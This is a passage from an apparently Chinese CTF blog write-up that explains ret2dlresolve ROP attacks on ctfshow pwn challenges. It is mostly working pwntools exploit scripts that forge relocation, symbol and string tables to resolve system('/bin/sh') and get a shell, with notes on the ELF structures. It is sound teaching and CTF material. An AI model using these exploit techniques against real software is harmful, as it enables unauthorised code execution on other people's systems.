class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = fake_sym_addr + <span class="number">0x10</span> -dynstr<span class="comment"># 因为 Elf32_Sym 的大小是16，所以加0x10(--&gt;b&#x27;write\x00&#x27;)</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;write\x00&#x27;</span>)<span class="comment">#str_name</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>能够正常输出</p>
<h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>这一次我们只用将原先的write字符改为system字符串，同时修改write的参数为system的参数即可获得shell，因为<code>_dl_runtime_resolve</code>函数最终是依赖函数名来解析目标地址的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = fake_sym_addr + <span class="number">0x10</span> -dynstr<span class="comment"># 因为 Elf32_Sym 的大小是16，所以加0x10(--&gt;b&#x27;write\x00&#x27;)</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;system\x00&#x27;</span>)<span class="comment">#str_name</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获得了shell</p>
<p>NO_RELRO的情况下我们是直接改.dynamic的strtab将其指向我们构造的.dynstr表</p>
<p>Partial RELRO的情况下我们是通过伪造一整个重定位表项的方式来调用目标函数。</p>
<h3 id="基于工具伪造"><a href="#基于工具伪造" class="headerlink" title="基于工具伪造"></a>基于工具伪造</h3><p><del>有了工具是真的方便，虽然这个漏洞已经很久远了</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p>
<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>ctfshow pwn 84</p>
<p>和32位差不多栈迁移到bss段上在bss段上伪造字符串表，将其中的read字符串替换为system字符串，直接修改.dynamic的strtab将其指向我们构造的.dynstr表</p>
<ol>
<li>在 bss 段伪造栈。栈中的数据为<ol>
<li>修改 .dynamic 节中字符串表的地址为伪造的地址</li>
<li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li>
<li>在特定的位置读取 &#x2F;bin&#x2F;sh 字符串。</li>
<li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li>
</ol>
</li>
<li>栈迁移到 bss 段。</li>
</ol>
<p>由于没有pop rdx我们使用万能gadget <code>_libc_csu</code>控制rdx的值</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-29_13-18-34.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28287)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line">leave_ret = <span class="number">0x40063c</span></span><br><span class="line">pop_rbp = <span class="number">0x400588</span></span><br><span class="line">show = <span class="number">0x400607</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400771</span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">read_plt0=<span class="number">0x400516</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx =r15</span></span><br><span class="line">    payload=p64(csu_end_addr)</span><br><span class="line">    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to CTFshowPWN!\n&quot;</span>)</span><br><span class="line">stack_size = <span class="number">0x200</span></span><br><span class="line">new_stack = bss_addr + <span class="number">0x100</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span> + <span class="number">8</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x600988</span>+<span class="number">8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(bss_addr+<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake dynstr</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss_addr+<span class="number">0x100</span>,<span class="built_in">len</span>(dynstr)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(dynstr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss_addr+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr),<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.raw(pop_rsi_r15)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(pop_rdi)</span><br><span class="line">rop.raw(bss_addr+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr))</span><br><span class="line">rop.raw(read_plt0)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>远程能通但是本地通不了，应该是本地的rdx不为零导致没有获得shell，暂时还不清楚是哪个函数导致的</p>
<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>ctfshow-pwn85</p>
<p>check</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<h4 id="手工伪造"><a href="#手工伪造" class="headerlink" title="手工伪造"></a>手工伪造</h4><p>64位的变化</p>
<p>glibc中默认编辑使用的是<code>ELF_Rela</code>来记录重定向的内容</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-31-16.png" alt="1"></p>
<p>这里Elf64_Addr、Elf64_Xword、Elf64_Sxword都为64位，因此Elf64_Rela结构体的大小为24字节。</p>
<p>根据IDA里的重定位表的信息可以知道，write函数在符号表中的偏移为1（0x100000007h&gt;&gt;32）</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-35-10.png" alt="1"></p>
<p>可以在符号表中印证偏移确实为1</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-37-07.png" alt="1"></p>
<p>在64位下，Elf64_Sym结构体为</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-38-22.png" alt="1"></p>
<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Word 32位</span><br><span class="line">Elf64_Section 16位</span><br><span class="line">Elf64_Addr 64位</span><br><span class="line">Elf64_Xword 64位</span><br></pre></td></tr></table></figure>

<p>所以Elf64_Sym的大小为24个字节</p>
<p>除此之外，在64位下，plt中的代码push的是待解析符号在重定位表中的索引，而不是偏移。比如，write函数push的是0。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-03_23-44-04.png" alt="1"></p>
<blockquote>
<p>据上方分析写出如下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf, store_addr, func_name, resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment"># reloc entry size</span></span><br><span class="line"></span><br><span class="line">    dynsym = elf.get_section_by_name(<span 